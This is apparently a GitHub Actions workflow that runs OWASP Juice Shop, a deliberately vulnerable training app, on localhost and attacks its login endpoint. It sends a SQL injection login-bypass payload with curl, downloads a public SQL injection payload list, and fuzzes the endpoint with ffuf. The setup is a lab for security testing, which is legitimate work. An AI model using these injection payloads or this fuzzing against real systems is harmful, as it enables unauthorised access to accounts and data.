name: Fuzzing

on:
  push:
    branches: [ main ]

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf:
    runs-on: ubuntu-latest
    services:
        juice:
          image: bkimminich/juice-shop
          ports:
            - 3000:3000
    steps:
      - name: Wait for service
        run: |
            sleep 10 
            curl --path-as-is -i -s -k -X $'POST' \
              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
              $'http://localhost:3000/rest/user/login'

      - name: Get payloads
        run: |
          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
      
      - name: Install fuzzing
        run: |
          go install github.com/ffuf/ffuf/v2@latest

      - name: Run fuzzing
        run: |
          python3 -c "
          import json
          import sys
          
          with open('SQL-Injection', 'r') as f:
              for line in f:
                  line = line.strip()
                  if line:
                      # Экранируем для JSON
                      print(json.dumps(line)[1:-1])  # Убираем внешние кавычки
          " > SQL-Injection-escaped
          
          echo "Original payloads: $(wc -l < SQL-Injection)"
          echo "Escaped payloads: $(wc -l < SQL-Injection-escaped)"
          
          # Запускаем ffuf с обработанными payloads
          $HOME/go/bin/ffuf \
            -u "http://localhost:3000/rest/user/login" \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"password"}' \
            -w SQL-Injection-escaped \
            -t 10 \
            -timeout 5 \
            -mc 200,302 \
            -o ffuf-output.json \
            -of json
          
          # Проверяем результаты
          echo "Results found: $(jq '.results | length' ffuf-output.json 2>/dev/null || echo 0)"

      - name: Get Logs from Service
        run: |
          docker logs $(docker ps -q) > juice-logs.log

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: security-reports-bundle
          path: |
            juice-logs.log
